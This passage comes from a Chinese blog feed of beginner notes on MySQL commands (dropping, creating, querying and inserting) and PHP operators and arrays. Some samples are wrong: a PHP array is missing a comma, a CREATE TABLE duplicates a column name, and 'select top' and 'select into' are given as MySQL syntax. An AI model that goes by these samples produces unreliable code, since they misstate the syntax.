class="hljs-keyword">database</span> 数据库名;</code></pre><h4 id="使用-mysqladmin-删除数据库"><a class="header-anchor" href="#使用-mysqladmin-删除数据库">🍭</a>使用 mysqladmin 删除数据库</h4><pre><code class="hljs autoit">[root<span class="hljs-symbol">@host]</span><span class="hljs-meta"># mysqladmin -u root -p drop BLACKPINK</span>Enter password:******</code></pre><p>执行以上删除数据库命令后，会出现一个提示框，来确认是否真的删除数据库。</p><h4 id="使用PHP脚本删除数据库"><a class="header-anchor" href="#使用PHP脚本删除数据库">🍭</a>使用PHP脚本删除数据库</h4><p>该命令与创建类似，不同地方在创建时</p><pre><code class="hljs arcade"><span class="hljs-symbol">$s</span>ql = <span class="hljs-string">&#x27;CREATE DATABASE BLACKPINK&#x27;</span>;</code></pre><p>在删除时变为</p><pre><code class="hljs arcade"><span class="hljs-symbol">$s</span>ql = <span class="hljs-string">&#x27;DROP DATABASE BLACKPINK&#x27;</span>;</code></pre><p><strong>但在使用PHP脚本删除数据库时不会出现确认是否删除信息，会直接删除指定数据库。</strong></p><h2 id="MySQL-选择数据库"><a class="header-anchor" href="#MySQL-选择数据库">🍭</a>MySQL 选择数据库</h2><h4 id="从命令提示窗口中选择"><a class="header-anchor" href="#从命令提示窗口中选择">🍭</a>从命令提示窗口中选择</h4><p>命令如下：</p><pre><code class="hljs elixir">[root<span class="hljs-variable">@host</span>]<span class="hljs-comment"># mysql -u root -p</span>Enter <span class="hljs-symbol">password:</span>******mysql&gt; <span class="hljs-keyword">use</span> BLACKPINK;Database changedmysql&gt;</code></pre><p><strong>所有的数据库名，表名，表字段都是区分大小写的。</strong></p><h4 id="使用PHP脚本"><a class="header-anchor" href="#使用PHP脚本">🍭</a>使用PHP脚本</h4><p>语法如下：</p><pre><code class="hljs reasonml">mysqli<span class="hljs-constructor">_select_db(<span class="hljs-params">connection</span>,<span class="hljs-params">dbname</span>)</span>;</code></pre><p>实例：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$dbhost = <span class="hljs-string">&#x27;localhost&#x27;</span>;  <span class="hljs-comment">// mysql服务器主机地址</span>$dbuser = <span class="hljs-string">&#x27;root&#x27;</span>;            <span class="hljs-comment">// mysql用户名</span>$dbpass = <span class="hljs-string">&#x27;123456&#x27;</span>;          <span class="hljs-comment">// mysql用户名密码</span>$conn = mysqli_connect($dbhost, $dbuser, $dbpass);<span class="hljs-keyword">if</span>(! $conn )&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;连接失败: &#x27;</span> . mysqli_error($conn));&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;连接成功&#x27;</span>;mysqli_select_db($conn, <span class="hljs-string">&#x27;BLACKPINK&#x27;</span> );mysqli_close($conn);<span class="hljs-meta">?&gt;</span></code></pre><h2 id="MySQL-创建数据表"><a class="header-anchor" href="#MySQL-创建数据表">🍭</a>MySQL 创建数据表</h2><p>语法：</p><pre><code class="hljs pgsql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-built_in">table_name</span> (<span class="hljs-built_in">column_name</span> column_type);</code></pre><p>实例:</p><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">IF</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> <span class="hljs-string">`blackpink_tbl`</span>(   <span class="hljs-string">`blackpink_id`</span> <span class="hljs-built_in">INT</span> <span class="hljs-keyword">UNSIGNED</span> AUTO_INCREMENT,   <span class="hljs-string">`blackpink_title`</span> <span class="hljs-built_in">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>,   <span class="hljs-string">`blackpink_author`</span> <span class="hljs-built_in">VARCHAR</span>(<span class="hljs-number">40</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>,   <span class="hljs-string">`submission_date`</span> <span class="hljs-built_in">DATE</span>,   PRIMARY <span class="hljs-keyword">KEY</span> ( <span class="hljs-string">`blackpink_id`</span> ))<span class="hljs-keyword">ENGINE</span>=<span class="hljs-keyword">InnoDB</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">CHARSET</span>=utf8;</code></pre><ul><li>AUTO_INCREMENT定义列为自增的属性，一般用于主键，数值会自动加1。</li><li>PRIMARY KEY关键字用于定义列为主键。 可以使用多列来定义主键，列间以逗号分隔。</li><li>ENGINE 设置存储引擎，CHARSET 设置编码。</li></ul><h4 id="使用命令提示符创建表"><a class="header-anchor" href="#使用命令提示符创建表">🍭</a>使用命令提示符创建表</h4><pre><code class="hljs routeros">root@host# mysql -u root -pEnter password:*******mysql&gt; use BLACKPINK;Database changedmysql&gt; CREATE TABLE runoob_tbl(   blackpink_id INT <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> AUTO_INCREMENT,   blackpink_title VARCHAR(100) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>,   blackpink_author VARCHAR(40) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>,   submission_date DATE,   PRIMARY KEY ( blackpink_id )   )<span class="hljs-attribute">ENGINE</span>=InnoDB<span class="hljs-built_in"> DEFAULT </span><span class="hljs-attribute">CHARSET</span>=utf8;Query OK, 0 rows affected (0.16 sec)mysql&gt;</code></pre><h4 id="使用PHP脚本创建数据表"><a class="header-anchor" href="#使用PHP脚本创建数据表">🍭</a>使用PHP脚本创建数据表</h4><p>与创建数据库类似，将$sql处代码换成如下:</p><pre><code class="hljs sql">$sql = &quot;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> blackpink_tbl( <span class="hljs-string">&quot;.</span><span class="hljs-string">        &quot;</span>blackpink_id <span class="hljs-built_in">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> AUTO_INCREMENT, <span class="hljs-string">&quot;.</span><span class="hljs-string">        &quot;</span>blackpink <span class="hljs-built_in">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;.</span><span class="hljs-string">        &quot;</span>blackpink <span class="hljs-built_in">VARCHAR</span>(<span class="hljs-number">40</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;.</span><span class="hljs-string">        &quot;</span>submission_date <span class="hljs-built_in">DATE</span>, <span class="hljs-string">&quot;.</span><span class="hljs-string">        &quot;</span>PRIMARY <span class="hljs-keyword">KEY</span> ( blackpink_id ))<span class="hljs-keyword">ENGINE</span>=<span class="hljs-keyword">InnoDB</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">CHARSET</span>=utf8; &quot;;mysqli_select_db( $conn, &#x27;blackpink&#x27; );</code></pre><h2 id="MySQL-删除数据表"><a class="header-anchor" href="#MySQL-删除数据表">🍭</a>MySQL 删除数据表</h2><p>语法与创建数据表类似，将create换成drop即可。</p><h2 id="MySQL-删除数据"><a class="header-anchor" href="#MySQL-删除数据">🍭</a>MySQL 删除数据</h2><p>删除&lt;满足条件的&gt;行</p><pre><code class="hljs n1ql"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> &lt;表名&gt; [<span class="hljs-keyword">where</span> &lt;删除条件&gt;]</code></pre><h2 id="MySQL-查询数据"><a class="header-anchor" href="#MySQL-查询数据">🍭</a>MySQL 查询数据</h2><p>语法如下:</p><pre><code class="hljs markdown">SELECT column<span class="hljs-emphasis">_name,column_</span>nameFROM table<span class="hljs-emphasis">_name</span><span class="hljs-emphasis">[WHERE Clause]</span><span class="hljs-emphasis">[<span class="hljs-string">LIMIT N</span>][<span class="hljs-symbol"> OFFSET M</span>]</span></code></pre><ul><li><p>查询语句可以使用一个或者多个表，表之间使用逗号分隔。</p></li><li><p>SELECT 可以读取一条或者多条记录。</p></li><li><p>使用 WHERE 语句来包含任何条件。</p></li><li><p>使用 LIMIT 属性来设定返回的记录数。</p></li><li><p>通过OFFSET指定SELECT语句开始查询的数据偏移量(默认情况下偏移量为0)</p></li></ul><h4 id="通过命令提示符"><a class="header-anchor" href="#通过命令提示符">🍭</a>通过命令提示符</h4><pre><code class="hljs pgsql"><span class="hljs-number">1.</span>精确（条件）查询<span class="hljs-keyword">select</span> &lt;列名&gt; <span class="hljs-keyword">from</span> &lt;表名&gt; [<span class="hljs-keyword">where</span> &lt;查询条件表达试&gt;] [<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> &lt;排序的列名&gt;[<span class="hljs-keyword">asc</span>或<span class="hljs-keyword">desc</span>]]<span class="hljs-number">2.</span>查询所有数据行和列<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表&gt;<span class="hljs-number">3.</span>查询部分行列<span class="hljs-comment">--条件查询</span><span class="hljs-keyword">select</span> i,j,k <span class="hljs-keyword">from</span> a <span class="hljs-keyword">where</span> f=<span class="hljs-number">5</span>//查询表a中f=<span class="hljs-number">5</span>的所有行，并显示i,j,k３列<span class="hljs-number">4.</span>在查询中使用ＡＳ更改列名<span class="hljs-keyword">select</span> <span class="hljs-type">name</span> <span class="hljs-keyword">as</span> 姓名 <span class="hljs-keyword">from</span> a <span class="hljs-keyword">where</span> xingbie=<span class="hljs-string">&#x27;男&#x27;</span>//查询a表中性别为男的所有行，显示<span class="hljs-type">name</span>列，并将<span class="hljs-type">name</span>列改名为（姓名）显示<span class="hljs-number">5.</span>查询空行<span class="hljs-keyword">select</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> a <span class="hljs-keyword">where</span> email <span class="hljs-keyword">is</span> <span class="hljs-keyword">null</span>//查询表a中email为空的所有行，并显示<span class="hljs-type">name</span>列；<span class="hljs-keyword">SQL</span>语句中用<span class="hljs-keyword">is</span> <span class="hljs-keyword">null</span>或者<span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>来判断是否为空行<span class="hljs-number">6.</span>在查询中使用常量<span class="hljs-keyword">select</span> <span class="hljs-type">name</span>, <span class="hljs-string">&#x27;唐山&#x27;</span> <span class="hljs-keyword">as</span> 地址 <span class="hljs-keyword">from</span> Student//查询表a，显示<span class="hljs-type">name</span>列，并添加地址列，其列值都为<span class="hljs-string">&#x27;唐山&#x27;</span><span class="hljs-number">7.</span>查询返回限制行数<span class="hljs-keyword">select</span> top <span class="hljs-number">6</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> a//查询表a，显示列<span class="hljs-type">name</span>的前６行，top为关键字<span class="hljs-keyword">select</span> top <span class="hljs-number">60</span> percent <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> a//查询表a，显示列<span class="hljs-type">name</span>的<span class="hljs-number">60</span>%，percent为关键字<span class="hljs-number">8.</span>查询排序（关键字：<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> , <span class="hljs-keyword">asc</span> , <span class="hljs-keyword">desc</span>）例：<span class="hljs-keyword">select</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> a <span class="hljs-keyword">where</span> chengji&gt;=<span class="hljs-number">60</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">desc</span>//查询a表中chengji大于等于<span class="hljs-number">60</span>的所有行，并按降序显示<span class="hljs-type">name</span>列；默认为ＡＳＣ升序<span class="hljs-number">9.</span>模糊查询使用<span class="hljs-keyword">like</span>进行模糊查询注意：<span class="hljs-keyword">like</span>运算副只用于字符串，所以仅与<span class="hljs-type">char</span>和<span class="hljs-type">varchar</span>数据类型联合使用<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> a <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;赵%&#x27;</span>//查询显示表a中，<span class="hljs-type">name</span>字段第一个字为赵的记录使用<span class="hljs-keyword">between</span>在某个范围内进行查询<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> a <span class="hljs-keyword">where</span> nianling <span class="hljs-keyword">between</span> <span class="hljs-number">18</span> <span class="hljs-keyword">and</span> <span class="hljs-number">20</span>//查询显示表a中nianling在<span class="hljs-number">18</span>到<span class="hljs-number">20</span>之间的记录使用<span class="hljs-keyword">in</span>在列举值内进行查询<span class="hljs-keyword">select</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> a <span class="hljs-keyword">where</span> address <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;北京&#x27;</span>,<span class="hljs-string">&#x27;上海&#x27;</span>,<span class="hljs-string">&#x27;唐山&#x27;</span>)//查询表a中address值为北京或者上海或者唐山的记录，显示<span class="hljs-type">name</span>字段<span class="hljs-number">10.</span>分组查询使用<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>进行分组查询<span class="hljs-keyword">select</span> studentID <span class="hljs-keyword">as</span> 学员编号,AVG(score) <span class="hljs-keyword">as</span> 平均成绩 (注释:这里的score是列名)<span class="hljs-keyword">from</span> score (注释:这里的score是表名)<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> studentID//在表score中查询，按strdentID字段分组，显示strdentID字段和score字段的平均值；<span class="hljs-keyword">select</span>语句中只允许被分组的列和为每个分组返回的一个值的表达式，例如用一个列名作为参数的聚合函数使用<span class="hljs-keyword">having</span>子句进行分组筛选<span class="hljs-keyword">select</span> studentID <span class="hljs-keyword">as</span> 学员编号,AVG(score) <span class="hljs-keyword">as</span> 平均成绩 (注释:这里的score是列名)<span class="hljs-keyword">from</span> score (注释:这里的score是表名)<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> studentID<span class="hljs-keyword">having</span> count(score)&gt;<span class="hljs-number">1</span>//接上面例子，显示分组后count(score)&gt;<span class="hljs-number">1</span>的行，由于<span class="hljs-keyword">where</span>只能在没有分组时使用，分组后只能使用<span class="hljs-keyword">having</span>来限制条件。<span class="hljs-number">11.</span>多表联接查询内联接：在<span class="hljs-keyword">where</span>子句中指定联接条件<span class="hljs-keyword">select</span> a.name,b.chengji <span class="hljs-keyword">from</span> a,b <span class="hljs-keyword">where</span> a.name=b.name//查询表a和表b中<span class="hljs-type">name</span>字段相等的记录，并显示表a中的<span class="hljs-type">name</span>字段和表b中的chengji字段在<span class="hljs-keyword">from</span>子句中使用<span class="hljs-keyword">join</span>…<span class="hljs-keyword">on</span><span class="hljs-keyword">select</span> a.name,b.chengji <span class="hljs-keyword">from</span> a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> b <span class="hljs-keyword">on</span> (a.name=b.name)外联接：左外联接查询<span class="hljs-keyword">select</span> s.name,c.courseID,c.score <span class="hljs-keyword">from</span> strdents <span class="hljs-keyword">as</span> s <span class="hljs-keyword">left outer join</span> score <span class="hljs-keyword">as</span> c<span class="hljs-keyword">on</span> s.scode=c.strdentID//在strdents表和score表中查询满足<span class="hljs-keyword">on</span>条件的行，条件为score表的strdentID与strdents表中的sconde相同右外联接查询<span class="hljs-keyword">select</span> s.name,c.courseID,c.score <span class="hljs-keyword">from</span> strdents <span class="hljs-keyword">as</span> s <span class="hljs-keyword">right outer join</span> score <span class="hljs-keyword">as</span> c<span class="hljs-keyword">on</span> s.scode=c.strdentID//在strdents表和score表中查询满足<span class="hljs-keyword">on</span>条件的行，条件为strdents表中的sconde与score表的strdentID相同</code></pre><h4 id="使用PHP脚本-v2"><a class="header-anchor" href="#使用PHP脚本-v2">🍭</a>使用PHP脚本</h4><p>使用 <strong>mysqli_query()</strong> 及 <strong>SQL SELECT</strong> 命令来获取数据。</p><p>通过  <strong>mysqli_fetch_array()</strong> 来使用或输出所有查询的数据，该函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有 返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。</p><h2 id="MySQL-插入数据"><a class="header-anchor" href="#MySQL-插入数据">🍭</a>MySQL 插入数据</h2><p>插入单行</p><pre><code class="hljs lisp">INSERT INTO table_name ( <span class="hljs-name">field1</span>, field2,...fieldN )                       VALUES                       ( <span class="hljs-name">value1</span>, value2,...valueN )<span class="hljs-comment">;</span></code></pre><p>将现有表数据添加到一个已有表</p><pre><code class="hljs n1ql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> &lt;已有的新表&gt; (列名) <span class="hljs-keyword">select</span> &lt;原表列名&gt; <span class="hljs-keyword">from</span> &lt;原表名&gt;</code></pre><p>直接拿现有表数据创建一个新表并填充</p><pre><code class="hljs pf">select <span class="hljs-variable">&lt;新建表列名&gt;</span> into <span class="hljs-variable">&lt;新建表名&gt;</span> <span class="hljs-keyword">from</span> <span class="hljs-variable">&lt;源表名&gt;</span></code></pre><h4 id="命令提示窗口"><a class="header-anchor" href="#命令提示窗口">🍭</a>命令提示窗口</h4><p>实例:</p><p>如果数据是字符型，必须使用单引号或者双引号，如：“福州”。</p><pre><code class="hljs mipsasm">mysql&gt; <span class="hljs-keyword">INSERT </span>INTO <span class="hljs-keyword">blackpink_tbl </span>       (<span class="hljs-keyword">blackpink_title, </span><span class="hljs-keyword">blackpink_author, </span><span class="hljs-keyword">submission_date)</span><span class="hljs-keyword"> </span>      VALUES       (<span class="hljs-string">&quot;大学&quot;</span>, <span class="hljs-string">&quot;福州&quot;</span>, NOW());Query OK, <span class="hljs-number">1</span> rows affected, <span class="hljs-number">1</span> warnings (<span class="hljs-number">0</span>.<span class="hljs-number">01</span> sec)mysql&gt; <span class="hljs-keyword">INSERT </span>INTO <span class="hljs-keyword">blackpink_tbl</span><span class="hljs-keyword"> </span>      (<span class="hljs-keyword">blackpink_title, </span><span class="hljs-keyword">blackpink_author, </span><span class="hljs-keyword">submission_date)</span><span class="hljs-keyword"> </span>      VALUES       (<span class="hljs-string">&quot;中学&quot;</span>, <span class="hljs-string">&quot;漳州&quot;</span>, <span class="hljs-string">&#x27;2014-09-01&#x27;</span>);Query OK, <span class="hljs-number">1</span> rows affected, <span class="hljs-number">1</span> warnings (<span class="hljs-number">0</span>.<span class="hljs-number">01</span> sec)mysql&gt; <span class="hljs-keyword">INSERT </span>INTO <span class="hljs-keyword">blackpink_tbl</span><span class="hljs-keyword"> </span>      (<span class="hljs-keyword">blackpink_title, </span><span class="hljs-keyword">blackpink_author, </span><span class="hljs-keyword">submission_date)</span><span class="hljs-keyword"> </span>      VALUES       (<span class="hljs-string">&quot;小学&quot;</span>, <span class="hljs-string">&quot;江都&quot;</span>, <span class="hljs-string">&#x27;2008-09-01&#x27;</span>);Query OK, <span class="hljs-number">1</span> rows affected (<span class="hljs-number">0</span>.<span class="hljs-number">00</span> sec)mysql&gt;</code></pre><p>读取数据表：select * from blackpink_tbl;</p><p>结果如下：</p><pre><code class="hljs asciidoc"><span class="hljs-code">+--------------+</span>-----------------<span class="hljs-code">+------------------+</span>-----------------+| blackpink<span class="hljs-emphasis">_id | blackpink_</span>title | blackpink<span class="hljs-emphasis">_author | submission_</span>date |<span class="hljs-code">+--------------+</span>-----------------<span class="hljs-code">+------------------+</span>-----------------+|            1 | 大学            | 福州             | 2020-10-17      ||            2 | 中学            | 漳州             | 2014-09-01      ||            3 | 小学            | 江都             | 2008-09-01      |<span class="hljs-code">+--------------+</span>-----------------<span class="hljs-code">+------------------+</span>-----------------+</code></pre><p>同样也可使用PHP脚本插入数据。</p><h2 id="MySQL改数据"><a class="header-anchor" href="#MySQL改数据">🍭</a>MySQL改数据</h2><pre><code class="hljs pf">update <span class="hljs-variable">&lt;表名&gt;</span> <span class="hljs-built_in">set</span> <span class="hljs-variable">&lt;列名=更新值&gt;</span> [where <span class="hljs-variable">&lt;更新条件&gt;</span>]</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php(二)</title>
    <link href="/2020/10/14/php%20(%E4%BA%8C)/"/>
    <url>/2020/10/14/php%20(%E4%BA%8C)/</url>
    
    <content type="html"><![CDATA[<h1>php (二)</h1><ul><li><a href="#php-%E4%BA%8C">php (二)</a><ul><li><a href="#php-%E8%BF%90%E7%AE%97%E7%AC%A6">PHP 运算符</a><ul><li><a href="#%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E7%AC%A6">算术运算符:</a></li><li><a href="#%E9%80%92%E5%A2%9E%E9%80%92%E5%87%8F%E8%BF%90%E7%AE%97%E7%AC%A6">递增/递减运算符：</a></li><li><a href="#%E6%AF%94%E8%BE%83%E8%BF%90%E7%AE%97%E7%AC%A6">比较运算符：</a></li><li><a href="#%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6">逻辑运算符:</a></li><li><a href="#%E4%B8%89%E5%85%83%E8%BF%90%E7%AE%97%E7%AC%A6">三元运算符:</a></li><li><a href="#%E7%BB%84%E5%90%88%E6%AF%94%E8%BE%83%E7%AC%A6php7">组合比较符(PHP7+):</a></li><li><a href="#%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7">运算符优先级:</a></li></ul></li><li><a href="#php%E8%AF%AD%E5%8F%A5">PHP语句</a><ul><li><a href="#if-%E8%AF%AD%E5%8F%A5">if 语句：</a></li><li><a href="#php---ifelse-%E8%AF%AD%E5%8F%A5">PHP - if…else 语句:</a></li><li><a href="#php---ifelseifelse-%E8%AF%AD%E5%8F%A5">PHP - if…elseif…else 语句:</a></li><li><a href="#switch-%E8%AF%AD%E5%8F%A5">Switch 语句：</a></li></ul></li><li><a href="#php-%E6%95%B0%E7%BB%84array">PHP 数组array()</a><ul><li><a href="#count-%E5%87%BD%E6%95%B0">count() 函数:</a></li><li><a href="#php-%E6%95%B0%E5%80%BC%E6%95%B0%E7%BB%84">PHP 数值数组：</a></li><li><a href="#%E9%81%8D%E5%8E%86%E6%95%B0%E5%80%BC%E6%95%B0%E7%BB%84">遍历数值数组:</a></li><li><a href="#%E5%85%B3%E8%81%94%E6%95%B0%E7%BB%84">关联数组:</a></li></ul></li><li><a href="#php-%E6%95%B0%E7%BB%84%E6%8E%92%E5%BA%8F">PHP 数组排序</a></li><li><a href="#php-%E8%B6%85%E7%BA%A7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F">PHP 超级全局变量</a><ul><li><a href="#globals">$GLOBALS</a></li><li><a href="#_server">$_SERVER</a></li><li><a href="#_request">$_REQUEST</a></li><li><a href="#_post">$_POST</a></li><li><a href="#_get">$_GET</a></li></ul></li><li><a href="#php-%E5%BE%AA%E7%8E%AF">PHP 循环</a><ul><li><a href="#while">while</a></li><li><a href="#dowhile-%E8%AF%AD%E5%8F%A5">do…while 语句</a></li><li><a href="#for-%E5%BE%AA%E7%8E%AF">for 循环</a></li><li><a href="#foreach-%E5%BE%AA%E7%8E%AF">foreach 循环</a></li></ul></li><li><a href="#php-%E5%87%BD%E6%95%B0">PHP 函数</a><ul><li><a href="#%E5%88%9B%E5%BB%BA-php-%E5%87%BD%E6%95%B0">创建 PHP 函数</a></li><li><a href="#php-%E5%87%BD%E6%95%B0---%E6%B7%BB%E5%8A%A0%E5%8F%82%E6%95%B0">PHP 函数 - 添加参数</a></li></ul></li><li><a href="#php-%E9%AD%94%E6%9C%AF%E5%B8%B8%E9%87%8F">PHP 魔术常量</a><ul><li><a href="#line"><strong>LINE</strong></a></li><li><a href="#file"><strong>FILE</strong></a></li><li><a href="#dir"><strong>DIR</strong></a></li><li><a href="#function"><strong>FUNCTION</strong></a></li><li><a href="#class"><strong>CLASS</strong></a></li><li><a href="#method"><strong>METHOD</strong></a></li><li><a href="#namespace"><strong>NAMESPACE</strong></a></li></ul></li></ul></li></ul><h2 id="PHP-运算符"><a class="header-anchor" href="#PHP-运算符">🍭</a>PHP 运算符</h2><h4 id="算术运算符"><a class="header-anchor" href="#算术运算符">🍭</a>算术运算符:</h4><table><thead><tr><th>x + y</th><th>x - y</th><th>x * y</th><th>x / y</th><th>x % y</th><th>- x</th><th style="text-align:center">a . b</th></tr></thead><tbody><tr><td>加</td><td>减</td><td>乘</td><td>除</td><td>模（除法的余数）</td><td>取反</td><td style="text-align:center">并置</td></tr></tbody></table><p>整除运算符 <strong>intdiv()</strong>，该函数返回值为第一个参数除于第二个参数的值并取整（向下取整）。</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>var_dump(intdiv(<span class="hljs-number">16</span>, <span class="hljs-number">5</span>));<span class="hljs-meta">?&gt;</span></code></pre><p>结果为3</p><h4 id="递增-递减运算符："><a class="header-anchor" href="#递增-递减运算符：">🍭</a>递增/递减运算符：</h4><table><thead><tr><th style="text-align:left">运算符</th><th style="text-align:left">名称</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">++ x</td><td style="text-align:left">预递增</td><td style="text-align:left">x 加 1，然后返回 x</td></tr><tr><td style="text-align:left">x ++</td><td style="text-align:left">后递增</td><td style="text-align:left">返回 x，然后 x 加 1</td></tr><tr><td style="text-align:left">– x</td><td style="text-align:left">预递减</td><td style="text-align:left">x 减 1，然后返回 x</td></tr><tr><td style="text-align:left">x –</td><td style="text-align:left">后递减</td><td style="text-align:left">返回 x，然后 x 减 1</td></tr></tbody></table><h4 id="比较运算符："><a class="header-anchor" href="#比较运算符：">🍭</a>比较运算符：</h4><table><thead><tr><th>x == y</th><th>x === y</th><th>x !== y</th><th>x&gt;y</th><th>x&lt;y</th><th>x&gt;=y</th><th>x&lt;=y</th><th>x != y,x &lt;&gt; y</th></tr></thead><tbody><tr><td>等于</td><td>绝对等于</td><td>绝对不等于</td><td>大于</td><td>小于</td><td>大于等于</td><td>小于等于</td><td>不等于</td></tr></tbody></table><h4 id="逻辑运算符"><a class="header-anchor" href="#逻辑运算符">🍭</a>逻辑运算符:</h4><table><thead><tr><th style="text-align:center">and，&amp;&amp;</th><th>or,||</th><th>xor</th><th>!x</th></tr></thead><tbody><tr><td style="text-align:center">与</td><td>或</td><td>异或</td><td>非</td></tr></tbody></table><h4 id="三元运算符"><a class="header-anchor" href="#三元运算符">🍭</a>三元运算符:</h4><pre><code class="hljs gcode"><span class="hljs-comment">(expr1)</span> ? <span class="hljs-comment">(expr2)</span> : <span class="hljs-comment">(expr3)</span></code></pre><p>对 expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3。</p><h4 id="组合比较符-PHP7"><a class="header-anchor" href="#组合比较符-PHP7">🍭</a>组合比较符(PHP7+):</h4><p>组合比较符（combined comparison operator）也称为太空船操作符，符号为 <strong>&lt;=&gt;</strong>。组合比较运算符可以轻松实现两个变量的比较，也不仅限于数值类数据的比较。</p><pre><code class="hljs pf"><span class="hljs-variable">$c</span> = <span class="hljs-variable">$a</span> <span class="hljs-variable">&lt;=&gt;</span> <span class="hljs-variable">$b</span>;</code></pre><ul><li>如果 <strong>$a &gt; $b</strong>, 则 <strong>$c</strong> 的值为 <strong>1</strong>。</li><li>如果 <strong>$a == $b</strong>, 则 <strong>$c</strong> 的值为 <strong>0</strong>。</li><li>如果 <strong>$a &lt; $b</strong>, 则 <strong>$c</strong> 的值为 <strong>-1</strong>。</li></ul><h4 id="运算符优先级"><a class="header-anchor" href="#运算符优先级">🍭</a>运算符优先级:</h4><p>运算符的优先级口诀：括（号）、单（操作数）、算（术）、移（位）、关（系）；位（运算符）、逻（辑）、条（件）、赋（值）、逗（号）。or 和 ||，&amp;&amp; 和 and 都是逻辑运算符，效果一样，但是其优先级却不一样。我们<strong>通过括号的配对来明确标明运算顺序，而非靠运算符优先级和结合性来决定，通常能够增加代码的可读性。</strong></p><h2 id="PHP语句"><a class="header-anchor" href="#PHP语句">🍭</a>PHP语句</h2><h4 id="if-语句："><a class="header-anchor" href="#if-语句：">🍭</a>if 语句：</h4><p>if 语句用于<strong>仅当指定条件成立时执行代码</strong>。</p><h4 id="PHP-if…else-语句"><a class="header-anchor" href="#PHP-if…else-语句">🍭</a>PHP - if…else 语句:</h4><p>在条件成立时执行一块代码，条件不成立时执行另一块代码。</p><h4 id="PHP-if…elseif…else-语句"><a class="header-anchor" href="#PHP-if…elseif…else-语句">🍭</a>PHP - if…elseif…else 语句:</h4><p>在若干条件之一成立时执行一个代码块。</p><h4 id="Switch-语句："><a class="header-anchor" href="#Switch-语句：">🍭</a>Switch 语句：</h4><p>switch 语句用于根据多个不同条件执行不同动作，有选择地执行若干代码块之一。</p><p>工作原理：首先对一个简单的表达式 <em>n</em>（通常是变量）进行一次计算。将表达式的值与结构中每个 case 的值进行比较。如果存在匹配，则执行与 case 关联的代码。代码执行后，使用 <strong>break</strong> 来阻止代码跳入下一个 case 中继续执行。<strong>default</strong> 语句用于不存在匹配（即没有 case 为真）时执行。</p><h2 id="PHP-数组array"><a class="header-anchor" href="#PHP-数组array">🍭</a>PHP 数组array()</h2><p>数组是一个能在单个变量中存储多个值的特殊变量。</p><ul><li><strong>数值数组</strong> - 带有数字 ID 键的数组</li><li><strong>关联数组</strong> - 带有指定的键的数组，每个键关联一个值</li><li><strong>多维数组</strong> - 包含一个或多个数组的数组</li></ul><h4 id="count-函数"><a class="header-anchor" href="#count-函数">🍭</a>count() 函数:</h4><p>count() 函数用于返回数组的长度（元素的数量)。</p><h4 id="PHP-数值数组："><a class="header-anchor" href="#PHP-数值数组：">🍭</a>PHP 数值数组：</h4><p>这里有两种创建数值数组的方法：</p><p>自动分配 ID 键（ID 键总是从 0 开始）</p><pre><code class="hljs lasso">$cars=<span class="hljs-built_in">array</span>(<span class="hljs-string">&quot;rose&quot;</span>,<span class="hljs-string">&quot;lisa&quot;</span>,<span class="hljs-string">&quot;jennie&quot;</span><span class="hljs-string">&quot;jisoo&quot;</span>);</code></pre><p>人工分配 ID 键：</p><pre><code class="hljs arcade"><span class="hljs-symbol">$cars</span>[<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;rose&quot;</span>;<span 